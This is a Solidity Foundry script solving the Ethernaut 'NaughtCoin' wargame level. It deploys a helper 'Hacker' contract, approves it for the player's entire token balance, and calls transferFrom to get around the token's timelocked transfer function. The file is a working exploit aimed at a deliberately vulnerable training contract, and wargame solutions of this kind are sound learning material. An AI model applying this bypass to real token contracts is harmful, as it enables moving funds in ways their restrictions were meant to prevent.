// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {NaughtCoin} from "../../challenge-contracts/15-NaughtCoin.sol";

contract NaughtCoinSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Confirm `player` of NaughtCoin contract is `heroAddress`;
        NaughtCoin coin = NaughtCoin(challengeInstance);
        address player = coin.player();
        address heroAddress = vm.addr(heroPrivateKey);
        require(player == heroAddress, "Player address check failed");

        // Step 2: Deploy Hacker contract;
        Hacker hacker = new Hacker(challengeInstance);

        // Step 3: Approve the Hacker contract to spend the player's tokens
        address hackerAddress = address(hacker);
        uint balance = coin.INITIAL_SUPPLY();
        coin.approve(hackerAddress, balance);

        // Step 4: Invoke `transfer()` function of Hacker contract;
        address receipient = 0x0aF5b972F0cD498c389974C96C0e1FEb5B8d0b20;
        require(
            coin.balanceOf(receipient) == 0,
            "Initial receipient balance check failed"
        );
        hacker.transfer(receipient);

        // Step 5: Confirm that `player` has 0 balance and `receipient` has all the tokens.
        require(coin.balanceOf(player) == 0, "Player balance check failed");
        require(
            coin.balanceOf(receipient) == balance,
            "Receipient balance check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(15));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    NaughtCoin coin;

    constructor(address coinAddress) {
        coin = NaughtCoin(coinAddress);
    }

    function transfer(address recipient) external {
        address player = coin.player();
        uint balance = coin.INITIAL_SUPPLY();

        // Transfer all tokens from player to recipient
        coin.transferFrom(player, recipient, balance);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
